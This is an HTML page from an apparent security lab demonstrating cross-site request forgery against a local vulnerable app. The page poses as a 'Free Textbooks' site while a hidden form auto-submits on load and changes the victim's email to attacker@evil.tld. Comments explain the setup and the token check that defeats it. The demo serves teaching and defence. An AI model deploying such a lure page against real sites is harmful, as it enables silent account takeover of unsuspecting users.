<!DOCTYPE html>
<!--
  CSRF Attack Page — targets VULNERABLE version at http://localhost:5001
  ======================================================================
  How it works:
    This page contains a hidden HTML form that POSTs to the /change_email
    endpoint on the vulnerable app.  The onload handler submits it
    automatically when the victim visits this page while already logged in
    to the portal.

  How to use:
    1. Log in to the vulnerable portal (localhost:5001) as alice in Tab A.
    2. Serve this directory with python3 -m http.server 8080 and visit
       http://localhost:8080/csrf.html in Tab B of the same browser profile.
    3. The form submits silently; refresh alice's profile on :5001 to confirm
       the email has been changed to attacker@evil.tld.

  Why it works:
    The vulnerable app does not check for a CSRF token.  The two localhost ports are cross-origin but same-site, so the browser
    sends the session cookie. Explicit SameSite=Lax does NOT generally allow
    cross-site POSTs; serve this page on http://localhost:8080 for the lab.

  Expected result on VULNERABLE (:5001):
    alice's email is silently changed to attacker@evil.tld.

  Expected result on SAFE (:5002):
    The server returns HTTP 403.  The missing csrf_token field fails
    secrets.compare_digest against the session-stored token.
    The email is NOT changed.
-->
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Textbooks — Campus Resource Hub</title>
  <style>
    body { font-family: sans-serif; padding: 2rem; background: #f8f8f8; }
    h1 { color: #1e3a8a; }
    p  { color: #555; }
  </style>
</head>
<body>
  <h1>Campus Resource Hub</h1>
  <p>Loading free textbook links, please wait...</p>

  <!-- Hidden attack form — submitted automatically on page load -->
  <form
    id="csrf-form"
    action="http://localhost:5001/change_email"
    method="POST"
    style="display:none;"
  >
    <input type="hidden" name="email" value="attacker@evil.tld">
    <!-- No csrf_token field — the vulnerable server does not require one -->
  </form>

  <script>
    // Submit the form as soon as the page loads — victim never sees it
    window.onload = function () {
      document.forms[0].submit();
    };
  </script>
</body>
</html>
